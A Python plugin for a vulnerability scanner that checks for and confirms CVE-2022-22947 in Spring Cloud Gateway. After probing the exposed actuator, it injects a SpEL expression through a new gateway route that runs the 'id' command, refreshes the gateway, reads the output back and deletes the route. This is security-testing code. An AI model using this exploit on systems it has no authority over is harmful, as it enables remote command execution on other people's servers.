from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("spring_cloud_gateway")


@register_scanner
class SpringCloudGatewayScanner(BaseScanner):
    name = "Spring Cloud Gateway SpEL RCE (CVE-2022-22947)"
    description = "Spring Cloud Gateway SPEL表达式注入导致远程代码执行"
    category = "spring"
    module = "spring_cloud_gateway"
    risk_level = "critical"
    risk_score = 10
    cve_ids = ["CVE-2022-22947"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2022-22947",
        "https://tanzu.vmware.com/security/cve-2022-22947",
    ]
    fix_suggestion = "升级Spring Cloud Gateway至3.1.1+或3.0.7+，禁用Actuator端点外网访问"

    def check(self) -> bool:
        routes_endpoint = f"{self.target}/actuator/gateway/routes"
        resp = http_request("GET", routes_endpoint)
        if resp is None or resp.status_code != 200:
            return False

        if "route_id" not in resp.text and "routes" not in resp.text.lower():
            return False

        self.add_result(
            name="Spring Cloud Gateway Actuator暴露",
            risk_level="high",
            risk_score=7,
            target_url=routes_endpoint,
            detail="Gateway路由管理端点未授权访问",
            response_snippet=resp.text[:500],
            evidence="可访问 /actuator/gateway/routes",
        )

        add_route_payload = {
            "id": "wyqy_test_route",
            "filters": [{
                "name": "AddResponseHeader",
                "args": {
                    "name": "Result",
                    "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}",
                },
            }],
            "uri": "http://example.com",
            "predicates": [{
                "name": "Path",
                "args": {"_genkey_0": "/wyqy_test/**"},
            }],
        }

        add_resp = http_request("POST", f"{self.target}/actuator/gateway/routes/wyqy_test_route",
                                json=add_route_payload,
                                headers={"Content-Type": "application/json"})
        if add_resp and add_resp.status_code in [200, 201]:
            refresh_resp = http_request("POST", f"{self.target}/actuator/gateway/refresh")
            check_resp = http_request("GET", f"{self.target}/actuator/gateway/routes/wyqy_test_route")
            if check_resp and check_resp.status_code == 200:
                self.add_result(
                    name="Spring Cloud Gateway SpEL RCE (CVE-2022-22947)",
                    risk_level="critical",
                    risk_score=10,
                    target_url=routes_endpoint,
                    detail="可通过Gateway路由注入SpEL表达式执行任意命令",
                    payload=str(add_route_payload),
                    response_snippet=check_resp.text[:500],
                    evidence="成功创建恶意路由并刷新网关配置",
                )

            http_request("DELETE", f"{self.target}/actuator/gateway/routes/wyqy_test_route")
            http_request("POST", f"{self.target}/actuator/gateway/refresh")
            return True

        return False
